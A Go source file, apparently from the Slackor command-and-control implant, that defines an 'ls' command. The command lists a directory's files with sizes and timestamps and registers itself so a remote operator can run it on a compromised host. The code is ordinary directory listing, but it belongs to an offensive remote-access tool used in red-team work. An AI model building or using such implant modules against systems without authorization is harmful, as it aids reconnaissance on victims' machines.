package common

import (
	"errors"
	"fmt"
	"io/ioutil"

	"github.com/Coalfire-Research/Slackor/pkg/command"
	"github.com/dustin/go-humanize"
)

// List the files in the given directory
type List struct{}

// Name is the name of the command
func (l List) Name() string {
	return "ls"
}

// Run lists the files in the given directory
func (l List) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) > 1 {
		return "", errors.New("ls takes 0 or 1 argument")
	}
	location := "./"
	if len(args) == 1 {
		location = args[0]
	}
	files, err := ioutil.ReadDir(location)
	if err != nil {
		return "", err
	}
	var result string
	for _, f := range files {
		size := humanize.IBytes(uint64(f.Size()))
		timestamp := f.ModTime()
		ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
		dir := "            "
		if f.IsDir() {
			dir = "   <DIR>    "
		}
		result = result + fmt.Sprintf("%-28v", ts) + dir + fmt.Sprintf("%-9v", size) + "     " + f.Name() + "\n"
	}
	return result, nil
}

func init() {
	command.RegisterCommand(List{})
}
